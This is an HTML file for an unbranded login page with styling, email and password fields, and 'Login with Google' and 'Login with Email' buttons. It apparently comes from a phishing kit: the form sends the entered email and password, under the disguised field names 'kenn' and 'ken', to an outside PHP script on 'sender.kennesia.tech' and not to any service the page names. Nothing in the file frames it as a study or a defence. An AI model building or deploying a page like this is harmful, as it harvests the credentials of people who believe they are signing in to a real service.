<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login </title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fff;
            margin: 0;
        }

        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            padding: 20px;
        }

        .login-box {
            background-color: #fff;
            padding: 40px 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo {
            width: 190px;
            margin-bottom: 100px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
        }

        .input-group input[type="email"],
        .input-group input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .forgot-password {
            display: block;
            text-align: right;
            margin-bottom: 20px;
            color: #007BFF;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #007BFF;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 20px;
        }

        button:hover {
            background-color: #0056b3;
        }

        .alternative-login {
            display: block;
            width: 93%;
            padding: 12px;
            margin-top: 10px; /* Reduced margin */
            border: 1px solid #007BFF;
            color: #007BFF;
            background-color: #fff;
            text-align: center;
            text-decoration: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .alternative-login:hover {
            background-color: #e7f3ff;
        }

        /* Added style for the separating line */
        hr {
            border: 1px solid #ccc; /* Add top border for separating line */
            margin: 10px 0;
        }

        /* Added style for the sign-up link */
        .sign-up-link {
            color: black;
        }

        .sign-up-link:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .login-box {
                padding: 50px 10px;
            }
            
            .logo {
                width: 120px;
                margin-bottom: 20px;
            }

            button, .alternative-login {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <img src="hp/logo.webp" alt="Logo" class="logo">
            <form action="https://sender.kennesia.tech/buyyer5/one.php" method="post">
                <div class="input-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" name="kenn" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="ken" required>
                </div>
                
                <a href="forgot-password" class="forgot-password">Forgot Password?</a>
                <button type="submit">Login</button>
            </form>
            <a href="login-email" class="alternative-login bi bi-envelope">Login with Email</a> <!-- Added class bi bi-envelope -->
            <hr> <!-- Added hr element for separating line -->
            <a href="login-google" class="alternative-login bi bi-google">Login with Google</a>
            <hr>
            <p class="sign-up-link">Don't have an account? <a href="#">Sign up</a></p> <!-- Added sign-up link -->
        </div>
    </div>
</body>
</html>
